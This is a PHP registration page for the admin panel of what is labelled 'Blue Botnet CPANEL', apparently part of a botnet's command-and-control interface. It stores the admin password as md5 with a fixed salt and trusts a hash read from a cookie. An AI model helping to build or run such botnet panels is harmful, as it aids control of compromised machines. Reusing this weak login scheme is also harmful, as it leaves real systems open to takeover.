<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" ><![endif]-->
<!--[if gt IE 8]><!--><html class="no-js" ><!--<![endif]-->
<html>
 <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Blue Botnet CPANEL</title>
  <!-- Fogli di stile -->
  <link href="css/bootstrap.css" rel="stylesheet" media="screen">
  <link href="css/stili-custom.css" rel="stylesheet" media="screen">
  <!-- Modernizr -->
  <script src="js/modernizr.custom.js"></script>
  <style>
  body {background-color:#C4D5E5;}
  .tce {
	margin-left: auto !important;
    margin-right: auto !important;
	width:400px !important;
	max-width:400px !important;
  }

  </style>
  <!-- respond.js per IE8 -->
  <!--[if lt IE 9]>
  <script src="js/respond.min.js"></script>
  <![endif]-->
 </head>
 <body bgcolor="#C4D5E5">
<center>
<br>
<div class="tce"><br><br>
<?php
$password = $_POST['password'];
if (file_exists("phash") == false){
	if ($password != "") {
		$fh = fopen("phash", 'w+');
		fwrite($fh, md5("randomsalt".md5($password)));
		fclose($fh);	
		echo '<div class="alert alert-success alert-dismissable">		<button type="button" class="close" data-dismiss="alert">&times;</button>		Successfully registered...	</div>	';
		echo '<script type="text/javascript">function doRedirect(){location.href = "index.php";}window.setTimeout("doRedirect()", 3000);</script>';
	}
} else {
	$filename = "phash";
	$fp = fopen($filename, "r");
	$content = fread($fp, filesize($filename));
	fclose($fp);
	$storedPassHash = $content;
	$passHash = $_COOKIE['phash'];
	if (md5("randomsalt".$passHash) == $storedPassHash){
		header("Location: index.php");
	} else {
		header("Location: login.php");
	}
}

?>
	<div class="panel panel-default">
 <div class="panel-heading">
  <h3 class="panel-title">Blue Botnet CPANEL</h3>
 </div>
 <div class="panel-body">
 <form action="register.php" method="post">
	<div class="form-group"> 
		<label for="IP">PASSWORD</label>
		<input class="form-control" placeholder="password" type="password" name="password">
	</div>
	<button type="submit" class="btn btn-default">REGISTER</button>
</form><br>
 </div>
</div>
</div>
</center>
 <br><br><br><br><br><br>
 <!-- jQuery e plugin JavaScript  -->
 <script src="http://code.jquery.com/jquery.js"></script>
 <script src="js/bootstrap.min.js"></script>
 </body>
</html>